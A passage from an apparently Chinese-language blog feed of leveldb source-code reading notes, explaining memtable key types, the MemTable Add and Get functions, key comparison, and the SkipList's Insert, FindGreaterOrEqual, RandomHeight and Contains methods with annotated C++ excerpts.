Key类型分类</h2><p>在说memtable的get和add操作前，我们先了解一下 <strong>leveldb 中</strong>的几种key类型。</p><p>在leveldb中做search操作时，search的过程大概是:</p><p>memtable-&gt;immutable memtable -&gt; sstable</p><p>这里涉及到2个search用到的key，一个在memtable中用，一个在sstable中用的key。</p><p>其实还有1个key，那就是用户自己输入的key，user-key。</p><p>总结起来就3种key，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">memtable: 逻辑上称为memtable_key</span><br><span class="line"></span><br><span class="line">sstalbe: 逻辑上称为internal_key</span><br><span class="line"></span><br><span class="line">key: 用户提供的key，我们称之为user_key</span><br></pre></td></tr></table></figure><p>leveldb是如何表示这3种key的？看下图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb_key.png" alt="img"></p><p>leveldb用一种类LookupKey包含了这3种key，我们要用的memtable_key其实就是Lookupkey。这一点，也可以从MemTable类的成员函数中可以看出，如Get操作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If memtable contains a value for key, store it in *value and return true.</span></span><br><span class="line"><span class="comment">// If memtable contains a deletion for key, store a NotFound() error</span></span><br><span class="line"><span class="comment">// in *status and return true.</span></span><br><span class="line"><span class="comment">// Else, return false.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Get</span><span class="params">(<span class="keyword">const</span> LookupKey&amp; key, <span class="built_in">std</span>::<span class="built_in">string</span>* value, Status* s)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="3-Add-操作"><a href="#3-Add-操作" class="headerlink" title="3. Add 操作"></a>3. Add 操作</h2><p>对key分类有了初步的认识后 ，我们就来看MemTable是如何将一个user key封装成一个memtable_key，然后将key value插入到skiplist中的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add an entry into memtable that maps key to value at the</span></span><br><span class="line"><span class="comment">// specified sequence number and with the specified type.</span></span><br><span class="line"><span class="comment">// Typically value will be empty if type==kTypeDeletion.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Add</span><span class="params">(SequenceNumber seq, ValueType type, <span class="keyword">const</span> Slice&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">const</span> Slice&amp; value)</span></span>;</span><br></pre></td></tr></table></figure><p>上面是Add的函数签名，注意到函数参数中有一个ValueType类型，我们知道leveldb中删除一个key并不会inplace update,而是插入一个带有删除标记的key。ValueType就是表示当前插入的是一个正常key还是一个删除key:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Value types encoded as the last component of internal keys.</span></span><br><span class="line"><span class="comment">// DO NOT CHANGE THESE ENUM VALUES: they are embedded in the on-disk</span></span><br><span class="line"><span class="comment">// data structures.</span></span><br><span class="line"><span class="keyword">enum</span> ValueType &#123; kTypeDeletion = <span class="number">0x0</span>, kTypeValue = <span class="number">0x1</span> &#125;;</span><br></pre></td></tr></table></figure><p>好了，现在来正式看看Add函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MemTable::Add</span><span class="params">(SequenceNumber s, ValueType type, <span class="keyword">const</span> Slice&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Format of an entry is concatenation of:</span></span><br><span class="line">  <span class="comment">//  key_size     : varint32 of internal_key.size()</span></span><br><span class="line">  <span class="comment">//  key bytes    : char[internal_key.size()]</span></span><br><span class="line">  <span class="comment">//  value_size   : varint32 of value.size()</span></span><br><span class="line">  <span class="comment">//  value bytes  : char[value.size()]</span></span><br><span class="line">  <span class="keyword">size_t</span> key_size = key.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">size_t</span> val_size = value.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">size_t</span> internal_key_size = key_size + <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> encoded_len = VarintLength(internal_key_size) +</span><br><span class="line">                             internal_key_size + VarintLength(val_size) +</span><br><span class="line">                             val_size;</span><br><span class="line">  <span class="keyword">char</span>* buf = arena_.Allocate(encoded_len);</span><br><span class="line">  <span class="keyword">char</span>* p = EncodeVarint32(buf, internal_key_size);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">memcpy</span>(p, key.data(), key_size);</span><br><span class="line">  p += key_size;</span><br><span class="line">  EncodeFixed64(p, (s &lt;&lt; <span class="number">8</span>) | type);</span><br><span class="line">  p += <span class="number">8</span>;</span><br><span class="line">  p = EncodeVarint32(p, val_size);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">memcpy</span>(p, value.data(), val_size);</span><br><span class="line">  assert(p + val_size == buf + encoded_len);</span><br><span class="line">  table_.Insert(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码很短，基本就是申请一个buf，然后填充数据,最后将buf插入到skiplist中。具体填充的字段如下：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LW1lbXRhYmxl5o+S5YWl5LiA5LiqZW50cnk=" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-memtable插入一个entry">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-memtable插入一个entry<i class="fa fa-external-link"></i></span> (1).png)</p><h2 id="4-Get操作"><a href="#4-Get操作" class="headerlink" title="4. Get操作"></a>4. Get操作</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If memtable contains a value for key, store it in *value and return true.</span></span><br><span class="line"><span class="comment">// If memtable contains a deletion for key, store a NotFound() error</span></span><br><span class="line"><span class="comment">// in *status and return true.</span></span><br><span class="line"><span class="comment">// Else, return false.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MemTable::Get</span><span class="params">(<span class="keyword">const</span> LookupKey&amp; key, <span class="built_in">std</span>::<span class="built_in">string</span>* value, Status* s)</span> </span>&#123;</span><br><span class="line">  Slice memkey = key.memtable_key();</span><br><span class="line">  <span class="function">Table::Iterator <span class="title">iter</span><span class="params">(&amp;table_)</span></span>;</span><br><span class="line">    <span class="comment">// 在skip中找到相应的memkey对应的node</span></span><br><span class="line">  iter.Seek(memkey.data());</span><br><span class="line">  <span class="keyword">if</span> (iter.Valid()) &#123;</span><br><span class="line">    <span class="comment">// entry format is:</span></span><br><span class="line">    <span class="comment">//    klength  varint32</span></span><br><span class="line">    <span class="comment">//    userkey  char[klength]</span></span><br><span class="line">    <span class="comment">//    tag      uint64</span></span><br><span class="line">    <span class="comment">//    vlength  varint32</span></span><br><span class="line">    <span class="comment">//    value    char[vlength]</span></span><br><span class="line">    <span class="comment">// Check that it belongs to same user key.  We do not check the</span></span><br><span class="line">    <span class="comment">// sequence number since the Seek() call above should have skipped</span></span><br><span class="line">    <span class="comment">// all entries with overly large sequence numbers.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* entry = iter.key();</span><br><span class="line">    <span class="keyword">uint32_t</span> key_length;</span><br><span class="line">      <span class="comment">// 提取memtable key。包括 klength + userkey + tag 字段</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* key_ptr = GetVarint32Ptr(entry, entry + <span class="number">5</span>, &amp;key_length);</span><br><span class="line">    <span class="keyword">if</span> (comparator_.comparator.user_comparator()-&gt;Compare(</span><br><span class="line">            Slice(key_ptr, key_length - <span class="number">8</span>), key.user_key()) == <span class="number">0</span>) &#123;<span class="comment">// 如果找到的key和需要get的key相同</span></span><br><span class="line">      <span class="comment">// Correct user key</span></span><br><span class="line">        <span class="comment">// 获取序列号+type字段</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint64_t</span> tag = DecodeFixed64(key_ptr + key_length - <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">switch</span> (<span class="keyword">static_cast</span>&lt;ValueType&gt;(tag &amp; <span class="number">0xff</span>)) &#123;<span class="comment">// &amp; 0xff 取最后1个字节</span></span><br><span class="line">        <span class="keyword">case</span> kTypeValue: &#123;<span class="comment">// 有value</span></span><br><span class="line">          Slice v = GetLengthPrefixedSlice(key_ptr + key_length);</span><br><span class="line">          value-&gt;assign(v.data(), v.<span class="built_in">size</span>());</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> kTypeDeletion:<span class="comment">// deletion 操作</span></span><br><span class="line">          *s = Status::NotFound(Slice());</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get的流程：</p><ol><li>根据传入key，到skiplist中找到相应的node</li><li>提取 node中的 memtable_key, 进一步从memtable_key中提取 user_key, 比较这个user_key和用户传入的user_key是否相同</li><li>提取 memtable_key中的tag(包括序列号和type)</li><li>查看type是哪种类型：<ol><li>正常有value，保存value</li><li>是删除的key，在Status s中保存NotFound的结果。</li></ol></li></ol><h2 id="5-在skiplist如何进行key的比较-amp-如果key相同，新旧数据如何确定？"><a href="#5-在skiplist如何进行key的比较-amp-如果key相同，新旧数据如何确定？" class="headerlink" title="5. 在skiplist如何进行key的比较 &amp; 如果key相同，新旧数据如何确定？"></a>5. 在skiplist如何进行key的比较 &amp; 如果key相同，新旧数据如何确定？</h2><p>通过InternalKeyComparator::Compare来确定。</p><p>规则：</p><ol><li>按照key的升序</li><li>key相同，按照序列号降序</li><li>序列号相同，按照type降序</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InternalKeyComparator::Compare</span><span class="params">(<span class="keyword">const</span> Slice&amp; akey, <span class="keyword">const</span> Slice&amp; bkey)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Order by:</span></span><br><span class="line">  <span class="comment">//    increasing user key (according to user-supplied comparator)</span></span><br><span class="line">  <span class="comment">//    decreasing sequence number</span></span><br><span class="line">  <span class="comment">//    decreasing type (though sequence# should be enough to disambiguate)</span></span><br><span class="line">  <span class="keyword">int</span> r = user_comparator_-&gt;Compare(ExtractUserKey(akey), ExtractUserKey(bkey));</span><br><span class="line">  <span class="keyword">if</span> (r == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> anum = DecodeFixed64(akey.data() + akey.<span class="built_in">size</span>() - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> bnum = DecodeFixed64(bkey.data() + bkey.<span class="built_in">size</span>() - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (anum &gt; bnum) &#123;</span><br><span class="line">      r = <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (anum &lt; bnum) &#123;</span><br><span class="line">      r = +<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>同时，seq number越大，代表数据越新。</strong></p><h2 id="6-迭代器Iterator"><a href="#6-迭代器Iterator" class="headerlink" title="6. 迭代器Iterator"></a>6. 迭代器Iterator</h2><p>这部分请看 MemTableIterator 。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ol><li><span class="exturl" data-url="aHR0cDovL2Jsb2cuMWZlbmcubWUvMjAxNi8wOS8xMC9sZXZlbGRiLXJlYWQv" title="http://blog.1feng.me/2016/09/10/leveldb-read/">Leveldb源码笔记之读操作<i class="fa fa-external-link"></i></span></li></ol>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-Memtable基础-Skiplist</title>
      <link href="/archives/931e70da.html"/>
      <url>/archives/931e70da.html</url>
      
        <content type="html"><![CDATA[<p>在leveldb中，memtable的实现是采用skiplist的，所以本篇文章，我们就来分析以下leveldb的skiplist。</p><p>对于不了解skiplist，建议先学习以下skiplist的基本概念，最好能跟着实现一个skiplist。</p><a id="more"></a><h2 id="1-skiplist的定义"><a href="#1-skiplist的定义" class="headerlink" title="1. skiplist的定义"></a>1. skiplist的定义</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">SkipList</span> &#123;</span></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// Create a new SkipList object that will use "cmp" for comparing keys,</span></span><br><span class="line">  <span class="comment">// and will allocate memory using "*arena".  Objects allocated in the arena</span></span><br><span class="line">  <span class="comment">// must remain allocated for the lifetime of the skiplist object.</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">SkipList</span><span class="params">(Comparator cmp, Arena* arena)</span></span>;</span><br><span class="line"></span><br><span class="line">  SkipList(<span class="keyword">const</span> SkipList&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  SkipList&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> SkipList&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Insert key into the list.</span></span><br><span class="line">  <span class="comment">// REQUIRES: nothing that compares equal to key is currently in the list.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(<span class="keyword">const</span> Key&amp; key)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns true iff an entry that compares equal to key is in the list.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">Contains</span><span class="params">(<span class="keyword">const</span> Key&amp; key)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Iteration over the contents of a skip list</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Iterator</span> &#123;</span></span><br><span class="line">     ...</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">enum</span> &#123; kMaxHeight = <span class="number">12</span> &#125;;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Immutable after construction</span></span><br><span class="line">  Comparator <span class="keyword">const</span> compare_;</span><br><span class="line">  Arena* <span class="keyword">const</span> arena_;  <span class="comment">// Arena used for allocations of nodes</span></span><br><span class="line"></span><br><span class="line">  Node* <span class="keyword">const</span> head_;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Modified only by Insert().  Read racily by readers, but stale</span></span><br><span class="line">  <span class="comment">// values are ok.</span></span><br><span class="line">  <span class="built_in">std</span>::atomic&lt;<span class="keyword">int</span>&gt; max_height_;  <span class="comment">// Height of the entire list</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Read/written only by Insert().</span></span><br><span class="line">  Random rnd_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>总体来看，这个skiplist只提供了, <code>Insert</code>和<code>Contains</code>两个接口。一个用于插入key，一个用于判断skiplist中是否存在具有和传入key相同的key的entry。为什么不提供delete接口？因为在leveldb中，一个删除操作就是一个插入一个具有“删除标记”的节点。所以删除即插入。</p><h2 id="2-Insert"><a href="#2-Insert" class="headerlink" title="2. Insert"></a>2. Insert</h2><p>insert插入一个节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Insert(<span class="keyword">const</span> Key&amp; key) &#123;</span><br><span class="line">  <span class="comment">// TODO(opt): We can use a barrier-free variant of FindGreaterOrEqual()</span></span><br><span class="line">  <span class="comment">// here since Insert() is externally synchronized.</span></span><br><span class="line">   <span class="comment">// prev存放搜索路径</span></span><br><span class="line">  Node* prev[kMaxHeight];</span><br><span class="line">    <span class="comment">// 设置搜索路径</span></span><br><span class="line">  Node* x = FindGreaterOrEqual(key, prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不允许出现相同节点</span></span><br><span class="line">  <span class="comment">// Our data structure does not allow duplicate insertion</span></span><br><span class="line">  assert(x == <span class="literal">nullptr</span> || !Equal(key, x-&gt;key));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 采用随机height确定新节点能插入的最高高度</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">height</span> = RandomHeight();</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">height</span> &gt; GetMaxHeight()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = GetMaxHeight(); i &lt; <span class="built_in">height</span>; i++) &#123;</span><br><span class="line">      prev[i] = head_;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 更新最高高度</span></span><br><span class="line">    <span class="comment">// It is ok to mutate max_height_ without any synchronization</span></span><br><span class="line">    <span class="comment">// with concurrent readers.  A concurrent reader that observes</span></span><br><span class="line">    <span class="comment">// the new value of max_height_ will see either the old value of</span></span><br><span class="line">    <span class="comment">// new level pointers from head_ (nullptr), or a new value set in</span></span><br><span class="line">    <span class="comment">// the loop below.  In the former case the reader will</span></span><br><span class="line">    <span class="comment">// immediately drop to the next level since nullptr sorts after all</span></span><br><span class="line">    <span class="comment">// keys.  In the latter case the reader will use the new node.</span></span><br><span class="line">    max_height_.store(<span class="built_in">height</span>, <span class="built_in">std</span>::memory_order_relaxed);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入新节点</span></span><br><span class="line">  x = NewNode(key, <span class="built_in">height</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">height</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// NoBarrier_SetNext() suffices since we will add a barrier when</span></span><br><span class="line">    <span class="comment">// we publish a pointer to "x" in prev[i].</span></span><br><span class="line">    x-&gt;NoBarrier_SetNext(i, prev[i]-&gt;NoBarrier_Next(i));</span><br><span class="line">    prev[i]-&gt;SetNext(i, x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>插入节点逻辑很清晰, 主要就是三个工作：</p><ol><li>通过<code>FindGreaterOrEqual</code>函数确定搜索路径, 保存在 <code>prev</code>中</li><li>生成本次插入节点的高度</li><li>插入新节点</li></ol><h3 id="1-FindGreaterOrEqual"><a href="#1-FindGreaterOrEqual" class="headerlink" title="1. FindGreaterOrEqual"></a>1. FindGreaterOrEqual</h3><p>说一下<code>FindGreaterOrEqual</code>函数的作用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Node*</span><br><span class="line">SkipList&lt;Key, Comparator&gt;::FindGreaterOrEqual(<span class="keyword">const</span> Key&amp; key,</span><br><span class="line">                                              Node** prev) <span class="keyword">const</span> &#123;</span><br><span class="line">  Node* x = head_;</span><br><span class="line">  <span class="keyword">int</span> level = GetMaxHeight() - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    Node* next = x-&gt;Next(level);</span><br><span class="line">    <span class="keyword">if</span> (KeyIsAfterNode(key, next)) &#123;</span><br><span class="line">      <span class="comment">// Keep searching in this list</span></span><br><span class="line">      x = next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (prev != <span class="literal">nullptr</span>) prev[level] = x;<span class="comment">// 保存路径到prev中</span></span><br><span class="line">      <span class="keyword">if</span> (level == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Switch to next list</span></span><br><span class="line">        level--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个例子：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200909215139172.png" alt=""></p><p>现在一共有4层，level0,1,2,3. 最下面为level0. , 则prev数组的有效长度为4(实际上都为kmaxHeight),假设要插入87, 图中红色虚线为要插入时所经过的路线，prev数组的作用就是保存这些路线。 比如 prev[0] 代表的是level0层的86， prev[1]代表的是level1层的71,以此类推。</p><h3 id="2-RandomHeight"><a href="#2-RandomHeight" class="headerlink" title="2.RandomHeight"></a>2.RandomHeight</h3><p>紧接上面的例子，现在找到了要插入的地点（86的后一个节点），思考一个问题， skiplist的上层节点是怎么生成的？如果只在level0中插入87，那如何生成上层的87？ 这部分就是通过RandomHeight来实现的，每次找到要插入的节点的位置时，就为这个节点生成一个高度，从0到这个高度都要插入这个节点，而高度是随机生成的，我们看看这个函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:RandomHeight() &#123;</span><br><span class="line">  <span class="comment">// Increase height with probability 1 in kBranching</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> kBranching = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">height</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">height</span> &lt; kMaxHeight &amp;&amp; ((rnd_.Next() % kBranching) == <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">height</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">  assert(<span class="built_in">height</span> &gt; <span class="number">0</span>);</span><br><span class="line">  assert(<span class="built_in">height</span> &lt;= kMaxHeight);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">height</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rnd_是一个随机对象，leveldb作者自己实现的随机数生成器，这部分我们不管，从这段代码来看， height是随机递增且不能超过预设的最大高度。</p><h2 id="3-Contains"><a href="#3-Contains" class="headerlink" title="3. Contains"></a>3. Contains</h2><p>这个函数没什么好说的，在skiplist中找到节点，如果存在这个节点，且key相同，则返回。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Contains(<span class="keyword">const</span> Key&amp; key) <span class="keyword">const</span> &#123;</span><br><span class="line">  Node* x = FindGreaterOrEqual(key, <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">if</span> (x != <span class="literal">nullptr</span> &amp;&amp; Equal(key, x-&gt;key)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span 